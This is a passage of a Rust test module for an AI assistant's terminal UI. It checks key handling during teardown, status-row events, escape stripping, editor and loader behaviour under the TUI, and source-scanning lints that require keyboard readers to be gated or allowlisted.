    fn teardown_keys_do_nothing_new_and_the_strip_says_leaving() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("draft");
        harness.app.begin_exit();
        assert!(harness.app.key_context().turn_running);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(harness.press(KeyCode::Esc), None);
        for c in ['o', 'd', 'c'] {
            assert_eq!(
                harness
                    .app
                    .handle_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::CONTROL)),
                None,
                "Ctrl+{c} during teardown"
            );
        }
        harness.type_text("!");
        assert_eq!(harness.app.composer_text(), "draft!");
        let rendered = harness.draw();
        assert!(rendered.contains("Leaving..."), "{rendered}");
    }

    /// A child agent's tool hooks leave the root's status row alone.
    #[test]
    fn only_root_tool_hooks_drive_the_status_row() {
        use crate::hooks::HookEvent;
        let (tx, mut rx) = unbounded_channel();
        let sink = TuiSink::new(tx);
        let hook = |origin: Origin| Event::Hook {
            event: HookEvent::ToolStarted,
            envs: vec![("COYOTE_TOOL_NAME".to_string(), "fs_write".to_string())],
            payload: None,
            origin,
        };
        sink.on_event(&hook(Origin {
            agent_id: Some("agent_1".to_string()),
            depth: 1,
        }));
        sink.on_event(&hook(Origin {
            agent_id: None,
            depth: 1,
        }));
        assert!(rx.try_recv().is_err());
        sink.on_event(&hook(Origin::detached()));
        assert!(matches!(
            rx.try_recv(),
            Ok(UiMsg::ToolRunning(Some(tool))) if tool == "fs_write"
        ));
    }

    /// Thinking events reach the status row through the sink, the same
    /// way the tool hooks do.
    #[test]
    fn thinking_events_pass_through_the_sink() {
        let (tx, mut rx) = unbounded_channel();
        let sink = TuiSink::new(tx);
        sink.on_event(&Event::ThinkingStarted);
        assert!(matches!(rx.try_recv(), Ok(UiMsg::ThinkingStarted)));
        sink.on_event(&Event::ThinkingStopped);
        assert!(matches!(rx.try_recv(), Ok(UiMsg::ThinkingStopped)));
        assert!(rx.try_recv().is_err());
    }

    /// Temp files `edit_in_editor` made for this process.
    #[cfg(unix)]
    fn editor_temp_files() -> Vec<std::path::PathBuf> {
        let marker = format!("-{}-tui-", std::process::id());
        std::fs::read_dir(std::env::temp_dir())
            .unwrap()
            .filter_map(Result::ok)
            .map(|entry| entry.path())
            .filter(|path| {
                path.file_name()
                    .and_then(|name| name.to_str())
                    .is_some_and(|name| name.contains(&marker) && name.ends_with(".md"))
            })
            .collect()
    }

    /// An editor that exits non-zero has not finished the edit: the text
    /// stays as it was, and the temp file is gone either way.
    #[test]
    #[cfg(unix)]
    fn a_failing_editor_leaves_the_text_as_it_was() {
        use std::os::unix::fs::PermissionsExt;
        let script = crate::utils::temp_file("-editor-", ".sh");
        std::fs::write(&script, "#!/bin/sh\nprintf changed > \"$1\"\nexit 3\n").unwrap();
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700)).unwrap();
        let before = editor_temp_files();

        let edited = edit_in_editor(script.to_str().unwrap(), "draft").unwrap();
        let after = editor_temp_files();
        std::fs::remove_file(&script).unwrap();

        assert_eq!(edited, "draft");
        assert_eq!(after, before, "the editor's temp file was left behind");
        let gone = edit_in_editor("true", "kept\n").unwrap();
        assert_eq!(gone, "kept");
    }

    /// Emitters paint notices for the REPL (`error_text`, a leading
    /// newline for spacing); the sink strips that so the cell shows the
    /// words on its first row and no escape bytes.
    #[test]
    fn a_painted_notice_reaches_the_frame_as_plain_words() {
        use crate::turn::UiSink;
        let (tx, mut rx) = unbounded_channel();
        let sink = TuiSink::new(tx);
        sink.notice(
            NoticeKind::Interrupted,
            "\n\x1b[31mResponse interrupted\x1b[0m",
        );
        let mut harness = Harness::standalone(40, 10);
        harness.app.handle_msg(rx.try_recv().unwrap());
        let frame = harness.draw();
        let first_row = frame.lines().next().unwrap();
        assert!(first_row.contains("Response interrupted"), "{frame}");
        assert!(!frame.contains("[31m"), "{frame}");
    }

    /// The final text of a reply is authoritative: it replaces whatever
    /// the stream had accumulated and closes the cell.
    #[test]
    fn assistant_text_replaces_an_open_stream_cell() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("hi", false);
        harness
            .app
            .handle_msg(UiMsg::TextDelta("partial".to_string()));
        harness
            .app
            .handle_msg(UiMsg::AssistantText("the whole reply".to_string()));
        assert_eq!(harness.app.cells.len(), 2);
        assert!(matches!(
            &harness.app.cells[1],
            Cell::Assistant { source, done: true, .. } if source == "the whole reply"
        ));
        harness
            .app
            .handle_msg(UiMsg::AssistantText("a second reply".to_string()));
        assert_eq!(harness.app.cells.len(), 3);
    }

    #[test]
    fn chrome_colours_are_dropped_under_no_color_but_attributes_stay() {
        for kind in [
            ChromeKind::Notice(NoticeKind::ToolWarning),
            ChromeKind::Error,
        ] {
            assert!(chrome_style(kind, false).fg.is_some(), "{kind:?}");
            assert_eq!(chrome_style(kind, true).fg, None, "{kind:?}");
        }
        let dim = ChromeKind::Notice(NoticeKind::Checkpoint);
        for no_color in [false, true] {
            let style = chrome_style(dim, no_color);
            assert_eq!(style.fg, None);
            assert!(style.add_modifier.contains(Modifier::DIM));
        }
    }

    /// What a prompt turn printed around the modal becomes a notice with
    /// its escapes removed; the spinner's glyph is text and stays.
    #[test]
    fn captured_output_becomes_a_clean_notice() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("ask", false);
        harness.app.end_turn(
            false,
            &TurnOutcome {
                captured: "\x1b[0G\u{280b}\x1b[?25l Thinking\x1b[1m!\x1b[0m\n".to_string(),
                ..TurnOutcome::default()
            },
        );
        assert!(matches!(
            harness.app.cells.last(),
            Some(Cell::Notice { text, .. }) if text == "\u{280b} Thinking!"
        ));
    }

    /// Anonymous tool output continues the cell it is streaming into, but
    /// never one left over from an earlier turn.
    #[test]
    fn anonymous_tool_output_never_joins_an_older_turn() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn(".run", true);
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b"first".to_vec(),
        });
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b" turn\n".to_vec(),
        });
        assert_eq!(harness.app.cells.len(), 2);
        harness.app.end_turn(true, &TurnOutcome::default());
        let cells_after_first = harness.app.cells.len();

        harness.app.begin_turn(".run", true);
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b"second turn\n".to_vec(),
        });
        assert_eq!(harness.app.cells.len(), cells_after_first + 2);
        assert!(matches!(
            harness.app.cells.last(),
            Some(Cell::Text { call_id: None, lines, .. }) if lines == &["second turn"]
        ));
        assert!(matches!(
            &harness.app.cells[1],
            Cell::Text { lines, .. } if lines == &["first turn"]
        ));
    }

    /// With a modal up the strip's interrupt hint would contradict the
    /// modal's own `Esc = cancel`. The hint also names what Enter answers,
    /// which follows the request's default.
    #[test]
    fn the_interrupt_hint_yields_to_an_open_modal() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("ask", false);
        assert!(harness.draw().contains("Esc to interrupt"));
        let _asker = ask_on_a_thread(&mut harness, confirm_request(None));
        let rendered = harness.draw();
        assert!(!rendered.contains("Esc to interrupt"), "{rendered}");
        assert!(
            rendered.contains("y = yes  n = no  Enter = yes  Esc = cancel"),
            "{rendered}"
        );
        harness.clock.advance(HOTKEY_IDLE);
        harness.press(KeyCode::Esc);
        let _asker = ask_on_a_thread(&mut harness, confirm_request(Some("fs_write")));
        assert!(
            harness
                .draw()
                .contains("y = yes  n = no  a = yes for this session  Enter = yes  Esc = cancel")
        );
        harness.press(KeyCode::Esc);
        let no_by_default = PromptRequest {
            default: Some(serde_json::json!(false)),
            ..confirm_request(None)
        };
        let _asker = ask_on_a_thread(&mut harness, no_by_default);
        let rendered = harness.draw();
        assert!(rendered.contains("Enter = no"), "{rendered}");
        harness.press(KeyCode::Esc);
    }

    /// A terminal that never goes quiet cannot hold the loop after the
    /// editor: the flush stops at its limit.
    #[tokio::test]
    async fn the_typeahead_flush_stops_at_its_limit() {
        let mut polled = 0;
        let mut stream = futures_util::stream::repeat_with(|| {
            polled += 1;
            Ok::<_, std::io::Error>(crossterm::event::Event::FocusGained)
        });
        flush_typeahead(&mut stream).await;
        drop(stream);
        assert_eq!(polled, TYPEAHEAD_LIMIT);
    }

    fn fn_body<'a>(source: &'a str, signature: &str) -> &'a str {
        let start = source
            .find(signature)
            .unwrap_or_else(|| panic!("{signature} not found"));
        let body = &source[start..];
        &body[..body.find("\n}\n").unwrap()]
    }

    /// A `(file, function)` pair under `src/` whose body reads the
    /// keyboard directly, with whether that body checks the TUI flag.
    struct KeyboardReader {
        file: String,
        function: String,
        gated: bool,
        /// The body calls `ensure_prompts_available()` before its prompt.
        prompt_gated: bool,
    }

    /// The name on a `fn` line, if the line declares one.
    fn declared_fn(line: &str) -> Option<&str> {
        let mut rest = line.trim_start();
        if rest.starts_with("//") {
            return None;
        }
        loop {
            if let Some(after) = rest.strip_prefix("pub") {
                rest = match after.strip_prefix('(') {
                    Some(scoped) => &scoped[scoped.find(')')? + 1..],
                    None => after,
                }
                .trim_start();
            } else if let Some(after) = ["async ", "unsafe ", "const "]
                .iter()
                .find_map(|prefix| rest.strip_prefix(prefix))
            {
                rest = after;
            } else {
                break;
            }
        }
        let name = rest.strip_prefix("fn ")?;
        let end = name.find(['(', '<'])?;
        Some(&name[..end])
    }

    /// Every `.rs` file under `dir`, sorted.
    fn rust_files(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
        fn walk(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
            for entry in std::fs::read_dir(dir).unwrap().flatten() {
                let path = entry.path();
                if path.is_dir() {
                    walk(&path, out);
                } else if path.extension().is_some_and(|ext| ext == "rs") {
                    out.push(path);
                }
            }
        }
        let mut files = Vec::new();
        walk(dir, &mut files);
        files.sort();
        files
    }

    /// Every direct keyboard read outside this module: crossterm's
    /// `read`/`poll`, `read_single_key`, `edit_file` (which hands the tty
    /// to `$EDITOR`), `run_command` and `wait_for_status` (a child on the
    /// inherited tty), and inquire's prompt builders (nothing else under
    /// `src/` constructs a `Text`, `Select` or the like).
    fn keyboard_readers() -> Vec<KeyboardReader> {
        fn at_word_start(line: &str, at: usize) -> bool {
            line[..at]
                .chars()
                .next_back()
                .is_none_or(|c| !(c.is_alphanumeric() || c == '_'))
        }
        const NEEDLES: [&str; 12] = [
            "event::read(",
            "event::poll(",
            "read_single_key(",
            "edit_file(",
            "run_command(",
            "wait_for_status(",
            "wait_for_status_interruptible(",
            "Confirm::new(",
            "Select::new(",
            "MultiSelect::new(",
            "Text::new(",
            "Password::new(",
        ];
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        let src = root.join("src");
        let mut readers: Vec<KeyboardReader> = Vec::new();
        for path in rust_files(&src) {
            if path.starts_with(src.join("tui")) {
                continue;
            }
            let text = std::fs::read_to_string(&path).unwrap();
            let lines: Vec<&str> = text.lines().collect();
            for (index, line) in lines.iter().enumerate() {
                if line.trim_start().starts_with("//") {
                    continue;
                }
                let hit = NEEDLES.iter().any(|needle| {
                    line.match_indices(needle)
                        .any(|(at, _)| at_word_start(line, at))
                });
                if !hit {
                    continue;
                }
                let fn_index = (0..=index)
                    .rev()
                    .find(|i| declared_fn(lines[*i]).is_some())
                    .unwrap_or_else(|| {
                        panic!("{}:{} is outside any fn", path.display(), index + 1)
                    });
                let fn_line = lines[fn_index];
                let indent = &fn_line[..fn_line.len() - fn_line.trim_start().len()];
                let close = format!("{indent}}}");
                let body_end = (fn_index..lines.len())
                    .find(|i| lines[*i] == close || (*i == fn_index && fn_line.ends_with('}')))
                    .unwrap();
                let body = lines[fn_index..=body_end].join("\n");
                let file = path.strip_prefix(root).unwrap().display().to_string();
                let function = declared_fn(fn_line).unwrap().to_string();
                if readers
                    .iter()
                    .any(|r| r.file == file && r.function == function)
                {
                    continue;
                }
                // The prompt gate counts only ahead of the first prompt
                // builder in the body: a check after the question has
                // been asked guards nothing.
                let gate_at = body.find("ensure_prompts_available()");
                let first_builder = NEEDLES[7..]
                    .iter()
                    .filter_map(|needle| body.find(needle))
                    .min();
                readers.push(KeyboardReader {
                    gated: body.contains("crate::tui::active()")
                        || body.contains("ensure_editor_available()"),
                    prompt_gated: gate_at
                        .is_some_and(|gate| first_builder.is_none_or(|builder| gate < builder)),
                    file,
                    function,
                });
            }
        }
        readers
    }

    /// Every direct keyboard reader outside this module either checks the
    /// TUI flag (itself, or through `ensure_editor_available`) or is
    /// listed here with the reason it stays REPL-only, so a new reader
    /// cannot appear without a decision about the TUI. A `PROMPT_GATED`
    /// row is only honoured when the fn body really calls
    /// `ensure_prompts_available()`, and a body that does cannot hide
    /// under another reason.
    #[test]
    fn every_direct_keyboard_reader_is_gated_or_accounted_for() {
        const PROMPT_GATED: &str = "reachable from a REPL command; refuses through \
            ensure_prompts_available, routing through ctx.prompter is owned debt";
        const BEFORE_UI: &str = "first-run config wizard; runs before any UI starts";
        const CLI_ONLY: &str = "a CLI flow (-e, --mcp); the process never reaches a UI";
        const REPL_PROMPTER: &str =
            "the REPL's Prompter; the TUI seats TuiPrompter on ctx.prompter instead";
        const VIA_GATE: &str = "calls read_single_key, which refuses under the TUI";
        const VIA_EDIT_GATE: &str = "calls edit_file, which refuses under the TUI";
        const VIA_RUN_GATE: &str = "calls run_command, which refuses under the TUI";
        const REPL_PAINTER: &str =
            "polled by the spinner and the REPL stream painter, both replaced under the TUI";
        const NULL_STDIN: &str = "a unit test; the child it waits on has stdin at /dev/null";
        let allowlist: &[(&str, &str, &str)] = &[
            (
                "src/client/common.rs",
                "create_openai_compatible_client_config",
                BEFORE_UI,
            ),
            (
                "src/client/common.rs",
                "set_client_models_config",
                BEFORE_UI,
            ),
            ("src/client/common.rs", "select_model", BEFORE_UI),
            ("src/client/common.rs", "prompt_input_string", BEFORE_UI),
            ("src/client/macros.rs", "create_client_config", BEFORE_UI),
            ("src/config/agent.rs", "init_graph_rags", PROMPT_GATED),
            ("src/config/bundles.rs", "resolve_bundle_name", PROMPT_GATED),
            ("src/config/conflict.rs", "select_choice", PROMPT_GATED),
            (
                "src/config/install_remote.rs",
                "uninstall_bundle",
                PROMPT_GATED,
            ),
            (
                "src/config/install_remote.rs",
                "select_uninstall_candidate",
                PROMPT_GATED,
            ),
            (
                "src/config/install_remote.rs",
                "prompt_for_each_secret",
                PROMPT_GATED,
            ),
            ("src/config/mod.rs", "confirm_asset_overwrite", VIA_GATE),
            ("src/config/mod.rs", "create_config_file", BEFORE_UI),
            ("src/config/mod.rs", "create_config_file_sandbox", BEFORE_UI),
            (
                "src/config/request_context.rs",
                "edit_config",
                VIA_EDIT_GATE,
            ),
            (
                "src/config/request_context.rs",
                "edit_mcp_config",
                VIA_EDIT_GATE,
            ),
            ("src/config/request_context.rs", "new_macro", PROMPT_GATED),
            ("src/config/request_context.rs", "new_role", PROMPT_GATED),
            ("src/config/request_context.rs", "save_role", PROMPT_GATED),
            ("src/config/update.rs", "run_self_update", PROMPT_GATED),
            ("src/main.rs", "shell_execute", CLI_ONLY),
            ("src/main.rs", "resolve_oauth_client", PROMPT_GATED),
            ("src/mcp/manage.rs", "handle_remove", CLI_ONLY),
            ("src/mcp/manage.rs", "handle_add", CLI_ONLY),
            ("src/mcp/manage.rs", "provision_secrets", CLI_ONLY),
            ("src/prompt/mod.rs", "select", REPL_PROMPTER),
            ("src/prompt/mod.rs", "confirm", REPL_PROMPTER),
            ("src/prompt/mod.rs", "prompt", REPL_PROMPTER),
            ("src/rag/mod.rs", "attach", PROMPT_GATED),
            ("src/rag/mod.rs", "sync_documents", PROMPT_GATED),
            ("src/rag/mod.rs", "select_embedding_model", PROMPT_GATED),
            ("src/rag/mod.rs", "select_rag_driver", PROMPT_GATED),
            ("src/rag/mod.rs", "select_extractor_model", PROMPT_GATED),
            ("src/rag/mod.rs", "set_chunk_size", PROMPT_GATED),
            ("src/rag/mod.rs", "set_graph_hops", PROMPT_GATED),
            ("src/rag/mod.rs", "set_chunk_overlay", PROMPT_GATED),
            ("src/rag/mod.rs", "add_documents", PROMPT_GATED),
            (
                "src/rag/mod.rs",
                "resolve_or_create_api_key_secret",
                PROMPT_GATED,
            ),
            (
                "src/repl/mod.rs",
                "run_repl_command_with_prefix",
                PROMPT_GATED,
            ),
            ("src/repl/mod.rs", "handle_shell_passthrough", VIA_RUN_GATE),
            (
                "src/utils/abort_signal.rs",
                "drain_terminal_events",
                REPL_PAINTER,
            ),
            (
                "src/utils/command.rs",
                "a_signal_killed_loader_is_not_a_success",
                NULL_STDIN,
            ),
            ("src/vault/mod.rs", "add_secret", PROMPT_GATED),
            ("src/vault/mod.rs", "update_secret", PROMPT_GATED),
            (
                "src/vault/utils.rs",
                "create_vault_password_file",
                PROMPT_GATED,
            ),
            ("src/vault/utils.rs", "prompt_provider_choice", PROMPT_GATED),
            ("src/vault/utils.rs", "prompt_aws_provider", PROMPT_GATED),
            ("src/vault/utils.rs", "prompt_gcp_provider", PROMPT_GATED),
            ("src/vault/utils.rs", "prompt_azure_provider", PROMPT_GATED),
            ("src/vault/utils.rs", "prompt_gopass_provider", PROMPT_GATED),
            (
                "src/vault/utils.rs",
                "prompt_one_password_provider",
                PROMPT_GATED,
            ),
        ];
        let readers = keyboard_readers();
        assert!(!readers.is_empty());
        let unaccounted: Vec<String> = readers
            .iter()
            .filter(|r| !r.gated)
            .filter(|r| {
                !allowlist
                    .iter()
                    .any(|(file, function, _)| *file == r.file && *function == r.function)
            })
            .map(|r| format!("{}:{}", r.file, r.function))
            .collect();
        assert!(
            unaccounted.is_empty(),
            "keyboard readers neither gated on crate::tui::active() nor allowlisted:\n{}",
            unaccounted.join("\n")
        );
        let stale: Vec<String> = allowlist
            .iter()
            .filter(|(file, function, _)| {
                !readers
                    .iter()
                    .any(|r| r.file == *file && r.function == *function && !r.gated)
            })
            .map(|(file, function, _)| format!("{file}:{function}"))
            .collect();
        assert!(
            stale.is_empty(),
            "allowlist entries with no matching ungated reader:\n{}",
            stale.join("\n")
        );
        let mislabelled: Vec<String> = allowlist
            .iter()
            .filter_map(|(file, function, reason)| {
                let reader = readers
                    .iter()
                    .find(|r| r.file == *file && r.function == *function)?;
                (reader.prompt_gated != (*reason == PROMPT_GATED)).then(|| {
                    if reader.prompt_gated {
                        format!("{file}:{function} calls ensure_prompts_available but is listed as: {reason}")
                    } else {
                        format!("{file}:{function} is listed as prompt-gated but does not call ensure_prompts_available ahead of its first prompt")
                    }
                })
            })
            .collect();
        assert!(
            mislabelled.is_empty(),
            "allowlist reasons that disagree with the fn body:\n{}",
            mislabelled.join("\n")
        );
        assert!(
            readers.iter().any(|r| r.file == "src/utils/input.rs"
                && r.function == "read_single_key"
                && r.gated)
        );
        assert!(
            readers
                .iter()
                .any(|r| r.file == "src/utils/command.rs" && r.function == "edit_file" && r.gated)
        );
        assert!(readers.iter().any(|r| r.file == "src/utils/command.rs"
            && r.function == "run_loader_command"
            && r.gated));
    }

    /// The two stdin readers outside this module stand down while the UI
    /// owns the terminal: no spinner polls the keyboard and no stale-input
    /// drain toggles raw mode under the event stream.
    #[test]
    fn every_other_stdin_reader_checks_the_tui_flag() {
        let spinner = include_str!("../utils/spinner.rs");
        assert!(
            fn_body(spinner, "pub async fn abortable_run_with_spinner_rx")
                .contains("crate::tui::active()")
        );
        let utils = include_str!("../utils/mod.rs");
        assert!(fn_body(utils, "pub fn drain_stale_tty_input").contains("crate::tui::active()"));
    }

    /// A keyboard prompt asked while the UI owns the terminal is refused
    /// outright: it comes back at once, on a thread that would otherwise
    /// be stuck on a read of stdin that the event stream owns.
    #[test]
    #[serial]
    fn read_single_key_refuses_under_the_tui_without_touching_stdin() {
        let _tui_on = crate::testing::AtomicFlagGuard::set(&TUI_ACTIVE, true);
        let (tx, rx) = mpsc::channel();
        std::thread::spawn(move || {
            let _ = tx.send(crate::utils::read_single_key(
                &['y', 'n'],
                'n',
                "\x1b[33mWARNING:\x1b[0m risky\nContinue? [y/N] ",
            ));
        });
        let answer = rx
            .recv_timeout(Duration::from_secs(2))
            .expect("the gate must answer without reading stdin");
        let err = answer.unwrap_err().to_string();
        assert_eq!(
            err,
            "Keyboard prompts are not available in the TUI yet; unanswered: Continue? [y/N]"
        );
    }

    /// `.edit` on a file is refused the same way: no editor is spawned
    /// onto the capture pipe (the name given is not a program at all).
    #[test]
    #[serial]
    fn edit_file_refuses_under_the_tui_without_spawning_an_editor() {
        let _tui_on = crate::testing::AtomicFlagGuard::set(&TUI_ACTIVE, true);
        let err = crate::utils::edit_file(
            "definitely-not-an-editor-x7x",
            std::path::Path::new("/dev/null"),
        )
        .unwrap_err();
        assert!(
            err.to_string().contains("not available in the TUI"),
            "{err}"
        );
    }

    /// `!cmd` is refused the same way: no shell is spawned onto the raw
    /// tty and the capture pipe (the name given is not a program at all).
    #[test]
    #[serial]
    fn run_command_refuses_under_the_tui_without_spawning_a_child() {
        let _tui_on = crate::testing::AtomicFlagGuard::set(&TUI_ACTIVE, true);
        let err = crate::utils::run_command("definitely-not-a-shell-x7x", &["-c", "true"], None)
            .unwrap_err();
        assert!(
            err.to_string().contains("not available in the TUI"),
            "{err}"
        );
    }

    /// A document loader that writes to its output file still runs under
    /// the TUI, with stdin at EOF instead of the raw tty: the `-` here
    /// reads stdin and adds nothing.
    #[cfg(unix)]
    #[tokio::test]
    #[serial]
    async fn a_file_writing_loader_still_runs_under_the_tui() {
        let _tui_on = crate::testing::AtomicFlagGuard::set(&TUI_ACTIVE, true);
        let source = crate::utils::temp_file("-loader-source-", ".txt");
        std::fs::write(&source, "loaded under the tui x7x\n").unwrap();
        let loaded = crate::utils::run_loader_command(
            source.to_str().unwrap(),
            "txt",
            "sh -c \"cat $1 - > $2\"",
        )
        .await
        .unwrap();
        std::fs::remove_file(&source).unwrap();
        assert_eq!(loaded, "loaded under the tui x7x\n");
    }

    /// A task id in the source names the owner of a debt marker and
    /// nothing else: every line carrying one is a lint suppression, a
    /// `todo!`, an ignored test, or the one pre-existing marker below.
    /// An id quoted as data (inside a string literal or a backtick code
    /// span, the way the planning-debris lint and its fixtures spell
    /// theirs) is a needle, not a reference. The needles here are spelled
    /// in halves so this test's source does not match itself.
    #[test]
    fn task_ids_mark_only_owned_debt() {
        fn quoted(line: &str, at: usize) -> bool {
            let before = &line[..at];
            let quotes = before
                .match_indices('"')
                .filter(|(i, _)| !before[..*i].ends_with('\\'))
                .count();
            quotes % 2 == 1 || before.matches('`').count() % 2 == 1
        }
        let id_prefix = concat!("TA", "SK-");
        // Split so a grep for suppression attributes does not match this list.
        let debt_markers = [
            concat!("#[", "allow("),
            concat!("#![", "allow("),
            concat!("#[", "expect("),
            concat!("#![", "expect("),
            "cfg_attr(",
            "todo!",
            "unimplemented!",
            concat!("#[", "ignore"),
        ];
        // Each entry is a refusal or a parked test whose line carries the
        // id of the work that removes it.
        let allowlisted: &[(&str, &str)] = &[
            (
                "src/function/prompt_channel.rs",
                "bail!(\"Prompt reply channel is not implemented on this platform\")",
            ),
            (
                "src/utils/command.rs",
                "bail!(\"Shell passthrough is not available in the TUI yet\")",
            ),
            (
                "src/utils/command.rs",
                "bail!(\"Editing files is not available in the TUI yet\")",
            ),
            (
                "src/utils/command.rs",
                "bail!(\"Interactive prompts are not available in the TUI yet\")",
            ),
            (
                "src/utils/input.rs",
                "bail!(\"Keyboard prompts are not available in the TUI yet; unanswered: {question}\")",
            ),
            (
                "src/tui/mod.rs",
                "let _ = reply.send(PromptAnswer::Cancelled);",
            ),
            ("src/tui/redirect.rs", "String::new()"),
            (
                "tests/tui_binary.rs",
                "the transcript is not yet printed on the normal screen when the UI leaves",
            ),
        ];
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        let mut offenders = Vec::new();
        for dir in ["src", "tests"] {
            for path in rust_files(&root.join(dir)) {
                let file = path.strip_prefix(root).unwrap().display().to_string();
                let text = std::fs::read_to_string(&path).unwrap();
                for (index, line) in text.lines().enumerate() {
                    let bare: Vec<usize> = line
                        .match_indices(id_prefix)
                        .map(|(at, _)| at)
                        .filter(|at| !quoted(line, *at))
                        .collect();
                    if bare.is_empty() {
                        continue;
                    }
                    let owned = debt_markers.iter().any(|marker| line.contains(marker));
                    let listed = allowlisted
                        .iter()
                        .any(|(f, needle)| *f == file && line.contains(needle));
                    if !owned && !listed {
                        offenders.push(format!("{file}:{}: {}", index + 1, line.trim()));
                    }
                }
            }
        }
        assert!(
            offenders.is_empty(),
            "task ids outside a debt marker:\n{}",
            offenders.join("\n")
        );
    }

    /// Comments in the UI's sources describe the code, not the process
    /// that produced it: none carries the vocabulary of a plan or a
    /// review. The needles are spelled in halves (or built from parts) so
    /// this test's source does not match itself.
    #[test]
    fn ui_comments_carry_no_planning_vocabulary() {
        let needles = [
            concat!("acceptance ", "criteri"),
            concat!("usage-", "probe"),
            concat!("usage-pattern ", "probe"),
            concat!("spec-", "first"),
        ]
        .map(str::to_lowercase);
        // Word-bounded needles: the word itself, a letter after `R-`, or
        // the word followed by a digit, with no letter or digit touching
        // either side.
        let bounded = [concat!("rul", "ing"), concat!("rul", "ings")];
        let is_boundary = |c: Option<char>| c.is_none_or(|c| !c.is_alphanumeric());
        let bounded_hit = |lower: &str, raw: &str| {
            let word = bounded.iter().any(|needle| {
                lower.match_indices(needle).any(|(at, _)| {
                    is_boundary(lower[..at].chars().next_back())
                        && is_boundary(lower[at + needle.len()..].chars().next())
                })
            });
            let ruling_id = raw.match_indices(concat!("R", "-")).any(|(at, _)| {
                let after = raw[at + 2..].chars().next();
                is_boundary(raw[..at].chars().next_back())
                    && after.is_some_and(|c| c.is_ascii_uppercase())
                    && is_boundary(raw[at + 3..].chars().next())
            });
            let numbered_round = lower.match_indices(concat!("rou", "nd ")).any(|(at, _)| {
                is_boundary(lower[..at].chars().next_back())
                    && lower[at + 6..]
                        .chars()
                        .next()
                        .is_some_and(|c| c.is_ascii_digit())
            });
            word || ruling_id || numbered_round
        };
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        let mut files = rust_files(&root.join("src/tui"));
        files.extend(rust_files(&root.join("tests/common")));
        files.push(root.join("tests/tui_binary.rs"));
        let mut offenders = Vec::new();
        for path in files {
            let file = path.strip_prefix(root).unwrap().display().to_string();
            let text = std::fs::read_to_string(&path).unwrap();
            for (index, line) in text.lines().enumerate() {
                if !line.trim_start().starts_with("//") {
                    continue;
                }
                let lower = line.to_lowercase();
                if needles.iter().any(|needle| lower.contains(needle)) || bounded_hit(&lower, line)
                {
                    offenders.push(format!("{file}:{}: {}", index + 1, line.trim()));
                }
            }
        }
        assert!(
            offenders.is_empty(),
            "planning vocabulary in comments:\n{}",
            offenders.join("\n")
        );
    }

    /// The UI's design follows the Codex CLI; both attribution files name
    /// it and point at its licence.
    #[test]
    fn the_codex_attribution_names_the_repo_and_its_licence_in_both_files() {
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        for file in ["NOTICE", "CREDITS.md"] {
            let text = std::fs::read_to_string(root.join(file)).unwrap();
            for needle in [
                "https://github.com/openai/codex",
                "https://github.com/openai/codex/blob/main/LICENSE",
            ] {
                assert!(text.contains(needle), "{file} lacks {needle}");
            }
        }
    }

    /// The keyboard-enhancement probe inside `Screen::enter` reads the tty
    /// and blocks, so the screen is entered before the signal streams are
    /// armed (a hang-up during the probe must still kill the process) and
    /// before the event stream takes stdin.
    #[test]
    fn run_enters_the_screen_then_arms_signals_and_starts_the_event_stream() {
        let run = fn_body(include_str!("mod.rs"), "pub async fn run(");
        let arm = run.find("Termination::arm()").unwrap();
        let enter = run.find("Screen::enter()").unwrap();
        let stream = run.find("EventStream::new()").unwrap();
        assert!(enter < arm, "signals armed before the screen was entered");
        assert!(
            enter < stream,
            "the event stream took stdin before the probe"
        );
    }
}
